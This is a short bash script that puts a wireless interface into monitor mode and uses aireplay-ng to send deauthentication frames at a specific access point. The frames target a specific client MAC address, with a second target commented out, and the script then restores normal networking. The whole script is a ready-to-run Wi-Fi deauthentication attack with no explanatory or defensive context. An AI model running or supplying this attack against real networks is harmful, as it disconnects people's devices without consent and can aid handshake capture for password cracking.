#!/bin/bash

ifconfig wlp2s0 down
airmon-ng check kill
iwconfig wlp2s0 mode monitor
ifconfig wlp2s0 up
# aireplay-ng --deauth 35 -a A0:14:3D:A5:BF:13 -c 44:5E:CD:90:39:36 wlp2s0
aireplay-ng --deauth 35 -a A0:14:3D:A5:BF:13 -c BA:DE:AD:7D:BC:08 wlp2s0

ifconfig wlp2s0 down
iwconfig wlp2s0 mode managed
ifconfig wlp2s0 up
service network-manager start
